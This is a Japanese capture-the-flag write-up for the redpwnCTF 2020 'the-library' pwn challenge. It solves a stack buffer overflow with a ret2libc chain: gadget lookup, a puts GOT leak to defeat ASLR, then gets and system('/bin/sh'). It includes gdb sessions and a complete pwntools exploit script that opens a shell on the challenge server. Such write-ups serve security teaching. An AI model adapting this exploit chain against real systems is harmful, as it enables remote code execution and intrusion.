# the-library:pwn:424pts
There's not a lot of useful functions in the binary itself. I wonder where you can get some...  
nc 2020.redpwnc.tf 31350  
[the-library](the-library)　　　　[the-library.c](the-library.c)　　　　[libc.so.6](libc.so.6)  

# Solution
the-libraryとソースとライブラリが与えられる。  
ソースは以下のようになっている。  
```c:the-library.c
#include <stdio.h>
#include <string.h>

int main(void)
{
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to the library... What's your name?");

  read(0, name, 0x100);
  puts("Hello there: ");
  puts(name);
}
```
はじめにchecksecを行う。  
```bash
$ ls
libc.so.6  the-library  the-library.c
$ git clone https://github.com/slimm609/checksec.sh.git
$ ./checksec.sh/checksec --format=csv --file=the-library
Partial RELRO,No Canary found,NX enabled,No PIE,No RPATH,No RUNPATH,Symbols,No,0,1,the-library
```
nameをオーバーフローさせられるようだ("A"*24はすぐに求まる)。  
しかし、systemがどこからも呼び出されていないため、retの飛び先をライブラリ内のsystemに飛ばしてやる必要がある。  
ret2libcとかいうやつらしい(初めてやった)。  
systemの引数には/bin/shを渡してやりたいため、呼び出し前にrdiレジスタに格納する必要がある。  
そのため、スタックをレジスタに格納するgadgetを経由する([rp](https://github.com/0vercl0k/rp)で見つける)。  
gdbでシェルを奪ってみる。  
今後、一部の出力は省略する。  
```
$ wget https://github.com/0vercl0k/rp/releases/download/v1/rp-lin-x64
$ ./rp-lin-x64 -f the-library -r 1 | grep "pop rdi ; ret  ;"
0x00400733: pop rdi ; ret  ;  (1 found)
$ gdb the-library
gdb-peda$ start
gdb-peda$ p system
$1 = {int (const char *)} 0x7fffff04f440 <__libc_system>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7fffff1b3e9a --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ n 21
Welcome to the library... What's your name?
TEST
gdb-peda$ n 7
~~~
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffed6c8 --> 0x7fffff021b97 (<__libc_start_main+231>:       mov    edi,eax)
0008| 0x7ffffffed6d0 --> 0x1
0016| 0x7ffffffed6d8 --> 0x7ffffffed7a8 --> 0x7ffffffed9d7 ("/the-library")
0024| 0x7ffffffed6e0 --> 0x100008000
0032| 0x7ffffffed6e8 --> 0x400637 --> 0x10ec8348e5894855
0040| 0x7ffffffed6f0 --> 0x0
0048| 0x7ffffffed6f8 --> 0xa26c62ed37ded563
0056| 0x7ffffffed700 --> 0x400550 --> 0x89485ed18949ed31
[------------------------------------------------------------------------------]
~~~
gdb-peda$ set *0x7ffffffed6c8 = 0x00400734
gdb-peda$ set *0x7ffffffed6cc = 0x00000000
gdb-peda$ set *0x7ffffffed6d0 = 0x00400733
gdb-peda$ set *0x7ffffffed6d4 = 0x00000000
gdb-peda$ set *0x7ffffffed6d8 = 0xff1b3e9a
gdb-peda$ set *0x7ffffffed6dc = 0x00007fff
gdb-peda$ set *0x7ffffffed6e0 = 0xff04f440
gdb-peda$ set *0x7ffffffed6e4 = 0x00007fff
gdb-peda$ stack
0000| 0x7ffffffed6c8 --> 0x400734 --> 0x841f0f2e6690c3
0008| 0x7ffffffed6d0 --> 0x400733 --> 0x841f0f2e6690c35f
0016| 0x7ffffffed6d8 --> 0x7fffff1b3e9a --> 0x68732f6e69622f ('/bin/sh')
0024| 0x7ffffffed6e0 --> 0x7fffff04f440 (<__libc_system>:       test   rdi,rdi)
0032| 0x7ffffffed6e8 --> 0x400637 --> 0x10ec8348e5894855
0040| 0x7ffffffed6f0 --> 0x0
0048| 0x7ffffffed6f8 --> 0xa26c62ed37ded563
0056| 0x7ffffffed700 --> 0x400550 --> 0x89485ed18949ed31
gdb-peda$ c
Continuing.
[New process 5037]
process 5037 is executing new program: /bin/dash
[New process 5038]
process 5038 is executing new program: /bin/dash
$
```
シェルが得られたがこれはASLRが無効な場合である。  
gdbは`set disable-randomization off`で有効にすることができる。  
以下が有効にした場合である(gdb起動まで上に同じ)。  
```bash
~~~
gdb-peda$ set disable-randomization off
gdb-peda$ start
gdb-peda$ p system
$1 = {int (const char *)} 0x7fd96104f440 <__libc_system>
gdb-peda$ start
gdb-peda$ p system
$2 = {int (const char *)} 0x7fd4ac04f440 <__libc_system>
gdb-peda$ start
gdb-peda$ p system
$3 = {int (const char *)} 0x7f327ea4f440 <__libc_system>
```
アドレスが変動していることがわかる。  
現実問題としてASLRがあるためsystemのアドレスを決定できない。  
しかし、メイン内で呼ばれているputsを利用することによりアドレスを求めることができる。  
libc.so.6のputsのオフセットをret2pltで出力した解決済みputsアドレスから減じることでlibcのベースが得られる。  
そこにlibc.so.6のsystemのオフセットを足せばよい。  
getsも使う。  
必要なアドレスを集める。  
```bash
$ gdb the-library
gdb-peda$ disass puts
Dump of assembler code for function puts@plt:
   0x0000000000400520 <+0>:     jmp    QWORD PTR [rip+0x200af2]        # 0x601018
   0x0000000000400526 <+6>:     push   0x0
   0x000000000040052b <+11>:    jmp    0x400510
End of assembler dump.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000400637 <+0>:     push   rbp
   0x0000000000400638 <+1>:     mov    rbp,rsp
   0x000000000040063b <+4>:     sub    rsp,0x10
   0x000000000040063f <+8>:     mov    rax,QWORD PTR [rip+0x2009fa]        # 0x601040 <stdout@@GLIBC_2.2.5>
   0x0000000000400646 <+15>:    mov    esi,0x0
~~~
gdb-peda$ info files
~~~
        0x0000000000601040 - 0x0000000000601070 is .bss
gdb-peda$ quit
$ ./rp-lin-x64 -f the-library -r 1 | grep "pop rdi ; ret  ;"
0x00400733: pop rdi ; ret  ;  (1 found)
$ nm -D libc.so.6 | grep " puts"
00000000000809c0 W puts
~~~
$ nm -D libc.so.6 | grep " gets"
00000000000800b0 W gets
~~~
$ nm -D libc.so.6 | grep " system"
000000000004f440 W system
```
これらを利用して以下のgetshell.pyでシェルを得ることができた。  
ioを切り替え、サーバーに接続する。  
```python:getshell.py
# -*- coding: utf-8 -*-
# https://blog.8f-nai.net/post/2019-01-14-seccon2018/より
from pwn import *

e = ELF("./the-library")
#io = process(e.path)
io = remote("2020.redpwnc.tf", 31350)

puts_plt = p64(0x400520)
puts_got = p64(0x601018)
main_func = p64(0x400637)
bss = p64(0x601040)
gadget = p64(0x400733)

puts_offset = 0x809c0
gets_offset = 0x800b0
system_offset = 0x4f440

payload = "A" * 24
payload += gadget
payload += puts_got
payload += puts_plt
payload += main_func

io.recvuntil("\n")
io.sendline(payload)
io.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAA\x33\x07\x40")
leak = io.recvuntil("W")
leak = leak.replace("\x0a\x57", "") #\nW

leak = leak.strip()
puts_addr = u64(leak.ljust(8, '\0'))
libc_base = puts_addr - puts_offset
gets_addr = libc_base + gets_offset
system_addr = libc_base + system_offset
print("libc_base:" + hex(libc_base))
print("puts_addr:" + hex(puts_addr))
print("gets_addr:" + hex(gets_addr))
print("system_addr:" + hex(system_addr))

payload = "A" * 24
payload += gadget
payload += bss
payload += p64(gets_addr)
payload += gadget
payload += bss
payload += p64(system_addr)

io.recvuntil("\n")
io.sendline(payload)
io.send("/bin/sh\n")
io.interactive()
```
lsしてflag.txtをcatする。  
```bash
$ python2 getshell.py
[*] '/the-library'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 2020.redpwnc.tf on port 31350: Done
libc_base:0x7fe752009000
puts_addr:0x7fe7520899c0
gets_addr:0x7fe7520890b0
system_addr:0x7fe752058440
[*] Switching to interactive mode
Hello there:
AAAAAAAAAAAAAAAAAAAAAAAA3\x07
$ ls
Makefile
bin
dev
flag.txt
lib
lib32
lib64
libc.so.6
the-library
the-library.c
$ cat flag.txt
flag{jump_1nt0_th3_l1brary}
```

## flag{jump_1nt0_th3_l1brary}